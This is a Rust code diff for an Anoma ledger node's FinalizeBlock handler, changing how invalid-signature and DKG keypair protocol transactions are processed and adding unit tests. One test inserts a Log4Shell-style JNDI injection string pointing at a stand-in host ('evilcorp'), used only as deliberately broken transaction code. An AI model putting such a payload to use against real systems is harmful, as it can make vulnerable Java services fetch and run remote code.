@@ -1,6 +1,7 @@
 //! Implementation of the `FinalizeBlock` ABCI++ method for the Shell
 
 use anoma::types::key::dkg_session_keys::DkgPublicKey;
+use anoma::types::key::ed25519::SignedTxData;
 use anoma::types::storage::BlockHash;
 use anoma::types::transaction::EncryptionKey;
 use ferveo::{DkgState, PvssScheduler};
@@ -75,20 +76,26 @@ where
             if ErrorCodes::from_u32(processed_tx.result.code).unwrap()
                 == ErrorCodes::InvalidSig
             {
-                let mut tx_result = match TxType::try_from(tx) {
+                let mut tx_result = match process_tx(tx.clone()) {
                     Ok(tx @ TxType::Wrapper(_))
                     | Ok(tx @ TxType::Protocol(_)) => {
                         Event::new_tx_event(&tx, height.0)
                     }
-                    _ => {
-                        tracing::error!(
-                            "Internal logic error: FinalizeBlock received a \
-                             tx with an invalid signature error code that \
-                             could not be deserialized to a WrapperTx / \
-                             ProtocolTx type"
-                        );
-                        continue;
-                    }
+                    _ => match TxType::try_from(tx) {
+                        Ok(tx @ TxType::Wrapper(_))
+                        | Ok(tx @ TxType::Protocol(_)) => {
+                            Event::new_tx_event(&tx, height.0)
+                        }
+                        _ => {
+                            tracing::error!(
+                                "Internal logic error: FinalizeBlock received \
+                                 a tx with an invalid signature error code \
+                                 that could not be deserialized to a \
+                                 WrapperTx / ProtocolTx type"
+                            );
+                            continue;
+                        }
+                    },
                 };
                 tx_result["code"] = processed_tx.result.code.to_string();
                 tx_result["info"] =
@@ -169,66 +176,91 @@ where
                 TxType::Protocol(ProtocolTx {
                     tx: protocol_tx,
                     pk,
-                }) => match protocol_tx {
-                    ProtocolTxType::DKG(msg) => {
-                        if let Some(sender) =
-                            self.get_validator_from_protocol_pk(pk)
-                        {
-                            if let ShellMode::Validator { dkg, .. } =
-                                &mut self.mode
-                            {
-                                if let Err(err) = dkg
-                                    .state_machine
-                                    .apply_message(sender, msg.clone())
+                }) => {
+                    if let Some(sender) =
+                        self.get_validator_from_protocol_pk(pk)
+                    {
+                        match protocol_tx {
+                            ProtocolTxType::DKG(msg) => {
+                                if let ShellMode::Validator { dkg, .. } =
+                                    &mut self.mode
                                 {
-                                    tracing::error!(
-                                        "Internal logic error: FinalizeBlock \
-                                         could not apply a verified DKG \
-                                         protocol message. Received error: {}",
-                                        err
-                                    );
-                                    continue;
+                                    if let Err(err) = dkg
+                                        .state_machine
+                                        .apply_message(sender, msg.clone())
+                                    {
+                                        tracing::error!(
+                                            "Internal logic error: \
+                                             FinalizeBlock could not apply a \
+                                             verified DKG protocol message. \
+                                             Received error: {}",
+                                            err
+                                        );
+                                        continue;
+                                    }
                                 }
+                                Event::new_tx_event(&tx_type, height.0)
+                            }
+                            ProtocolTxType::NewDkgKeypair(tx) => {
+                                // we update our new session keypair from the
+                                // queue
+                                // after then inner transaction
+                                // has been applied by the protocol
+                                let data = SignedTxData::try_from_slice(
+                                    &tx.data.as_ref().expect("This This was verified by Process Proposal")[..]
+                                )
+                                .expect("This was verified by Process Proposal")
+                                .data
+                                .expect("This was verified by Process Proposal");
+                                let UpdateDkgSessionKey {
+                                    address,
+                                    dkg_public_key,
+                                } = BorshDeserialize::deserialize(&mut data.as_slice())
+                                .expect(
+                                    "This was verified by Prepare Proposal",
+                                );
+                                let dkg_public_key: DkgPublicKey =
+                                    BorshDeserialize::deserialize(
+                                        &mut dkg_public_key.as_ref(),
+                                    )
+                                    .expect(
+                                        "This was verified by Prepare Proposal",
+                                    );
+                                if Some(&address)
+                                    == self.mode.get_validator_address()
+                                    && Some(dkg_public_key)
+                                        != self
+                                            .mode
+                                            .get_next_dkg_keypair()
+                                            .map(|kp| kp.public())
+                                {
+                                    // this is not the new keypair requested by
+                                    // this
+                                    // validator,
+                                    // an immediate refresh is needed
+                                    self.request_new_dkg_session_keypair();
+                                } else {
+                                    actions.enqueue(|shell| {
+                                        shell.update_dkg_session_keypair()
+                                    });
+                                }
+
+                                Event::new_tx_event(&tx_type, height.0)
                             }
                         }
-                        Event::new_tx_event(&tx_type, height.0)
+                    } else {
+                        let mut tx_result =
+                            Event::new_tx_event(&tx_type, height.0);
+                        tx_result["code"] = ErrorCodes::InvalidSig.into();
+                        tx_result["info"] = "Could not match signature of \
+                                             protocol tx to a public protocol \
+                                             key of an active validator set."
+                            .into();
+                        tx_result["gas_used"] = "0".into();
+                        response.events.push(tx_result.into());
+                        continue;
                     }
-                    ProtocolTxType::NewDkgKeypair(tx) => {
-                        // we update our new session keypair from the queue
-                        // after then inner transaction
-                        // has been applied by the protocol
-
-                        let UpdateDkgSessionKey {
-                            address,
-                            dkg_public_key,
-                        } = BorshDeserialize::deserialize(
-                            &mut tx
-                                .data
-                                .as_ref()
-                                .expect("This was verified by Prepare Proposal")
-                                .as_ref(),
-                        )
-                        .expect("This was verified by Prepare Proposal");
-                        let dkg_public_key = BorshDeserialize::deserialize(
-                            &mut dkg_public_key.as_ref(),
-                        )
-                        .expect("This was verified by Prepare Proposal");
-                        if Some(&address) == self.mode.get_validator_address()
-                            && Some(&dkg_public_key)
-                                != self.mode.get_next_dkg_keypair()
-                        {
-                            // this is not the new keypair requested by this
-                            // validator,
-                            // an immediate refresh is needed
-                            self.request_new_dkg_session_keypair();
-                        }
-
-                        actions.enqueue(|shell| {
-                            shell.update_dkg_session_keypair()
-                        });
-                        Event::new_tx_event(&tx_type, height.0)
-                    }
-                },
+                }
             };
 
             match protocol::apply_tx(
@@ -556,6 +588,7 @@ where
 #[cfg(test)]
 mod test_finalize_block {
     use anoma::types::address::xan;
+    use anoma::types::key::dkg_session_keys::dkg_pk_key;
     use anoma::types::storage::Epoch;
     use anoma::types::time::DateTimeUtc;
     use anoma::types::transaction::Fee;
@@ -573,6 +606,8 @@ mod test_finalize_block {
     use crate::node::ledger::shims::abcipp_shim_types::shim::request::{
         FinalizeBlock, ProcessedTx,
     };
+    use crate::wallet::{ValidatorData, ValidatorKeys};
+    use anoma::types::key::ed25519::SignedTxData;
 
     /// This is just to be used in testing. It is not
     /// a meaningful default.
@@ -853,6 +888,137 @@ mod test_finalize_block {
         }
         // check that the corresponding wrapper tx was removed from the queue
         assert!(shell.next_wrapper().is_none());
+    }
+
+    /// Test that unsigned transactions rejected by [`process_proposal`]
+    /// return correct event.
+    #[test]
+    fn test_unsigned_tx_event() {
+        let (mut shell, _) = setup();
+        let keypair = gen_keypair();
+        let wrapper = Tx::new(
+            vec![],
+            Some(
+                TxType::Wrapper(WrapperTx::new(
+                    Fee {
+                        amount: 0.into(),
+                        token: xan(),
+                    },
+                    &keypair,
+                    Epoch(0),
+                    0.into(),
+                    Tx::new(vec![], None),
+                ))
+                .try_to_vec()
+                .expect("Test failed"),
+            ),
+        );
+        let processed_tx = ProcessedTx {
+            tx: wrapper.to_bytes(),
+            result: TxResult {
+                code: ErrorCodes::InvalidSig.into(),
+                info: "".into(),
+            },
+        };
+        let events = shell
+            .finalize_block(FinalizeBlock {
+                txs: vec![processed_tx],
+                reject_all_decrypted: false,
+                ..Default::default()
+            })
+            .expect("Test failed");
+        assert_eq!(events.len(), 1);
+        assert_eq!(events[0].r#type, "accepted");
+        let code = events[0]
+            .attributes
+            .iter()
+            .find(|attr| attr.key.as_str() == "code")
+            .expect("Test failed")
+            .value
+            .as_str();
+        assert_eq!(code, String::from(ErrorCodes::InvalidSig).as_str());
+    }
+
+    /// Test that if a protocol tx is rejected by [`process_proposal`] that
+    /// the correct event is returned
+    #[test]
+    fn test_rejected_invalid_sig_protocol_tx() {
+        let (mut shell, _) = setup();
+        // check that the protocol tx was not applied
+        let rng = &mut ark_std::test_rng();
+        let non_validator_keys = gen_keypair();
+        let protocol_tx =
+            if let ShellMode::Validator { dkg, .. } = &mut shell.shell.mode {
+                let msg = dkg.state_machine.share(rng).expect("Test failed");
+                ProtocolTxType::DKG(msg).sign(&non_validator_keys)
+            } else {
+                panic!("Test failed");
+            };
+        let processed_tx = ProcessedTx {
+            tx: protocol_tx.to_bytes(),
+            result: TxResult {
+                code: ErrorCodes::InvalidSig.into(),
+                info: "".into(),
+            },
+        };
+        let events = shell
+            .finalize_block(FinalizeBlock {
+                txs: vec![processed_tx],
+                reject_all_decrypted: false,
+                ..Default::default()
+            })
+            .expect("Test failed");
+        assert_eq!(events.len(), 1);
+        assert_eq!(events[0].r#type, "applied");
+        let code = events[0]
+            .attributes
+            .iter()
+            .find(|attr| attr.key.as_str() == "code")
+            .expect("Test failed")
+            .value
+            .as_str();
+        assert_eq!(code, String::from(ErrorCodes::InvalidSig).as_str());
+    }
+
+    /// Test that if a protocol tx is signed by a non-validator,
+    /// the correct event is returned
+    #[test]
+    fn test_rejected_non_validator_sig_protocol_tx() {
+        let (mut shell, _) = setup();
+        // check that the protocol tx was not applied
+        let rng = &mut ark_std::test_rng();
+        let non_validator_keys = gen_keypair();
+        let protocol_tx =
+            if let ShellMode::Validator { dkg, .. } = &mut shell.shell.mode {
+                let msg = dkg.state_machine.share(rng).expect("Test failed");
+                ProtocolTxType::DKG(msg).sign(&non_validator_keys)
+            } else {
+                panic!("Test failed");
+            };
+        let processed_tx = ProcessedTx {
+            tx: protocol_tx.to_bytes(),
+            result: TxResult {
+                code: ErrorCodes::Ok.into(),
+                info: "".into(),
+            },
+        };
+        let events = shell
+            .finalize_block(FinalizeBlock {
+                txs: vec![processed_tx],
+                reject_all_decrypted: false,
+                ..Default::default()
+            })
+            .expect("Test failed");
+        assert_eq!(events.len(), 1);
+        assert_eq!(events[0].r#type, "applied");
+        let code = events[0]
+            .attributes
+            .iter()
+            .find(|attr| attr.key.as_str() == "code")
+            .expect("Test failed")
+            .value
+            .as_str();
+        assert_eq!(code, String::from(ErrorCodes::InvalidSig).as_str());
     }
 
     /// Test that the wrapper txs are queued in the order they
@@ -1176,5 +1342,375 @@ mod test_finalize_block {
             counter += 1;
         }
         assert_eq!(counter, 3);
+    }
+
+    /// Test that if a tx requesting a new DKG session keypair
+    /// succeeds, it keeps storage and local state in sync
+    #[test]
+    fn test_new_dkg_keypair() {
+        let (mut shell, mut receiver) = setup();
+        assert_matches!(
+            shell.shell.mode,
+            ShellMode::Validator {
+                next_dkg_keypair: None,
+                ..
+            }
+        );
+
+        shell.shell.request_new_dkg_session_keypair();
+
+        // test that the request is broadcast
+        let tx_bytes =
+            tokio_test::block_on(async move { receiver.recv().await.unwrap() });
+        // test that we received the expected request
+        let tx =
+            process_tx(Tx::try_from(tx_bytes.as_slice()).expect("Test failed"))
+                .expect("Test failed");
+        match tx {
+            TxType::Protocol(ProtocolTx {
+                tx:
+                    ProtocolTxType::NewDkgKeypair(Tx {
+                        data: Some(data), ..
+                    }),
+                ..
+            }) => {
+                let signed_data = SignedTxData::try_from_slice(&data[..])
+                    .expect("Test failed")
+                    .data
+                    .expect("Test failed");
+                let UpdateDkgSessionKey {
+                    address,
+                    dkg_public_key,
+                } = BorshDeserialize::deserialize(&mut signed_data.as_slice())
+                    .expect("Test failed");
+                let dkg_public_key: DkgPublicKey =
+                    BorshDeserialize::deserialize(
+                        &mut dkg_public_key.as_slice(),
+                    )
+                    .expect("Test failed");
+                assert_eq!(
+                    &address,
+                    shell
+                        .shell
+                        .mode
+                        .get_validator_address()
+                        .expect("Test failed")
+                );
+                assert_eq!(
+                    dkg_public_key,
+                    shell
+                        .shell
+                        .mode
+                        .get_next_dkg_keypair()
+                        .expect("Test failed")
+                        .public()
+                );
+            }
+            _ => {
+                panic!("Test failed");
+            }
+        }
+
+        let processed_tx = ProcessedTx {
+            tx: tx_bytes,
+            result: TxResult {
+                code: ErrorCodes::Ok.into(),
+                info: "".into(),
+            },
+        };
+        let mut response = shell
+            .finalize_block(FinalizeBlock {
+                txs: vec![processed_tx],
+                reject_all_decrypted: false,
+                ..Default::default()
+            })
+            .expect("Test failed");
+        // check that the tx was applied
+        assert_eq!(response.len(), 1);
+        let event = response.remove(0);
+        assert_eq!(event.r#type, "applied");
+        let code = event
+            .attributes
+            .iter()
+            .find(|attr| attr.key.as_str() == "code")
+            .expect("Test failed")
+            .value
+            .as_str();
+        assert_eq!(code, String::from(ErrorCodes::Ok).as_str());
+
+        // check that there is no next keypair now
+        assert_matches!(
+            shell.shell.mode,
+            ShellMode::Validator {
+                next_dkg_keypair: None,
+                ..
+            }
+        );
+        // check that the session public key in storage still matches local
+        // state
+        let dkg_pk = shell
+            .shell
+            .storage
+            .read(&dkg_pk_key(
+                shell
+                    .shell
+                    .mode
+                    .get_validator_address()
+                    .expect("Test failed"),
+            ))
+            .expect("Test failed")
+            .0
+            .expect("Test failed");
+        let dkg_pk: DkgPublicKey =
+            BorshDeserialize::deserialize(&mut dkg_pk.as_slice())
+                .expect("Test failed");
+        if let ShellMode::Validator {
+            data:
+                ValidatorData {
+                    keys:
+                        ValidatorKeys {
+                            dkg_keypair: Some(kp),
+                            ..
+                        },
+                    ..
+                },
+            ..
+        } = &shell.shell.mode
+        {
+            assert_eq!(kp.public(), dkg_pk);
+        } else {
+            panic!("Test failed");
+        }
+    }
+
+    /// Test that if a tx requesting a new DKG session keypair
+    /// is received but no new keypair is queued in local state,
+    /// a new request is issued to generate a new session keypair.
+    #[test]
+    fn test_next_dkg_keypair_is_none() {
+        let (mut shell, mut receiver) = setup();
+        let processed_tx = if let ShellMode::Validator {
+            data,
+            next_dkg_keypair,
+            ..
+        } = &shell.shell.mode
+        {
+            // ensure no new session keypair is queued
+            assert_matches!(next_dkg_keypair, None);
+            let protocol_keys = data.keys.protocol_keypair.lock();
+            let request_data = UpdateDkgSessionKey {
+                address: data.address.clone(),
+                dkg_public_key: data
+                    .keys
+                    .dkg_keypair
+                    .as_ref()
+                    .unwrap()
+                    .public()
+                    .try_to_vec()
+                    .expect("Serialization of DKG public key shouldn't fail"),
+            };
+            ProcessedTx {
+                tx: ProtocolTxType::request_new_dkg_keypair(
+                    request_data,
+                    &protocol_keys,
+                    &shell.shell.wasm_dir,
+                    read_wasm,
+                )
+                .sign(&protocol_keys)
+                .to_bytes(),
+                result: TxResult {
+                    code: ErrorCodes::Ok.into(),
+                    info: "".into(),
+                },
+            }
+        } else {
+            panic!("Test failed");
+        };
+
+        let mut response = shell
+            .finalize_block(FinalizeBlock {
+                txs: vec![processed_tx],
+                reject_all_decrypted: true,
+                ..Default::default()
+            })
+            .expect("Test failed");
+
+        assert_eq!(response.len(), 1);
+        let event = response.remove(0);
+        assert_eq!(event.r#type, "applied");
+        let code = event
+            .attributes
+            .iter()
+            .find(|attr| attr.key.as_str() == "code")
+            .expect("Test failed")
+            .value
+            .as_str();
+        assert_eq!(code, String::from(ErrorCodes::Ok).as_str());
+
+        let tx_bytes =
+            tokio_test::block_on(async move { receiver.recv().await.unwrap() });
+        let tx =
+            process_tx(Tx::try_from(tx_bytes.as_slice()).expect("Test failed"))
+                .expect("Test failed");
+        match tx {
+            TxType::Protocol(ProtocolTx {
+                tx:
+                    ProtocolTxType::NewDkgKeypair(Tx {
+                        data: Some(data), ..
+                    }),
+                ..
+            }) => {
+                let UpdateDkgSessionKey {
+                    address,
+                    dkg_public_key,
+                } = BorshDeserialize::deserialize(&mut data.as_slice())
+                    .expect("Test failed");
+                let dkg_public_key: DkgPublicKey =
+                    BorshDeserialize::deserialize(
+                        &mut dkg_public_key.as_slice(),
+                    )
+                    .expect("Test failed");
+                assert_eq!(
+                    &address,
+                    shell
+                        .shell
+                        .mode
+                        .get_validator_address()
+                        .expect("Test failed")
+                );
+                assert_eq!(
+                    dkg_public_key,
+                    shell
+                        .shell
+                        .mode
+                        .get_next_dkg_keypair()
+                        .expect("Test failed")
+                        .public()
+                );
+            }
+            _ => {
+                panic!("Test failed");
+            }
+        }
+    }
+
+    /// Test that if a tx requesting a new DKG session keypair
+    /// is rejected by the wasm runner, no state changes occur
+    /// and we do not update the DKG session keypair in local
+    /// state.
+    #[test]
+    fn test_new_dkg_keypair_wasm_failure() {
+        let (mut shell, _) = setup();
+        let processed_tx = if let ShellMode::Validator {
+            data,
+            next_dkg_keypair,
+            ..
+        } = &mut shell.shell.mode
+        {
+            // ensure no new session keypair is queued
+            *next_dkg_keypair = Some(
+                ferveo_common::Keypair::<EllipticCurve>::new(
+                    &mut ark_std::rand::prelude::StdRng::from_entropy(),
+                )
+                .into(),
+            );
+            let protocol_keys = data.keys.protocol_keypair.lock();
+            let request_data = UpdateDkgSessionKey {
+                address: data.address.clone(),
+                dkg_public_key: next_dkg_keypair
+                    .as_ref()
+                    .unwrap()
+                    .public()
+                    .try_to_vec()
+                    .expect("Serialization of DKG public key shouldn't fail"),
+            };
+
+            let mut request = ProtocolTxType::request_new_dkg_keypair(
+                request_data,
+                &protocol_keys,
+                &shell.shell.wasm_dir,
+                read_wasm,
+            );
+            // put in wasm that won't run correctly
+            match &mut request {
+                ProtocolTxType::NewDkgKeypair(tx) => {
+                    tx.code = "$(jndi:ldap://evilcorp)".as_bytes().to_owned();
+                }
+                _ => panic!("Test failed"),
+            }
+            ProcessedTx {
+                tx: request.sign(&protocol_keys).to_bytes(),
+                result: TxResult {
+                    code: ErrorCodes::Ok.into(),
+                    info: "".into(),
+                },
+            }
+        } else {
+            panic!("Test failed");
+        };
+
+        let mut response = shell
+            .finalize_block(FinalizeBlock {
+                txs: vec![processed_tx],
+                reject_all_decrypted: true,
+                ..Default::default()
+            })
+            .expect("Test failed");
+        // check that we got an error in the wasm
+        assert_eq!(response.len(), 1);
+        let event = response.remove(0);
+        assert_eq!(event.r#type, "applied");
+        let code = event
+            .attributes
+            .iter()
+            .find(|attr| attr.key.as_str() == "code")
+            .expect("Test failed")
+            .value
+            .as_str();
+        assert_eq!(code, String::from(ErrorCodes::WasmRuntimeError).as_str());
+
+        // check that the session keypair queue is unchanged
+        assert_matches!(
+            shell.shell.mode,
+            ShellMode::Validator {
+                next_dkg_keypair: Some(_),
+                ..
+            }
+        );
+        // check that the session public key in storage still matches local
+        // state
+        let dkg_pk = shell
+            .shell
+            .storage
+            .read(&dkg_pk_key(
+                shell
+                    .shell
+                    .mode
+                    .get_validator_address()
+                    .expect("Test failed"),
+            ))
+            .expect("Test failed")
+            .0
+            .expect("Test failed");
+        let dkg_pk: DkgPublicKey =
+            BorshDeserialize::deserialize(&mut dkg_pk.as_slice())
+                .expect("Test failed");
+        if let ShellMode::Validator {
+            data:
+                ValidatorData {
+                    keys:
+                        ValidatorKeys {
+                            dkg_keypair: Some(kp),
+                            ..
+                        },
+                    ..
+                },
+            ..
+        } = &shell.shell.mode
+        {
+            assert_eq!(kp.public(), dkg_pk);
+        } else {
+            panic!("Test failed");
+        }
     }
 }
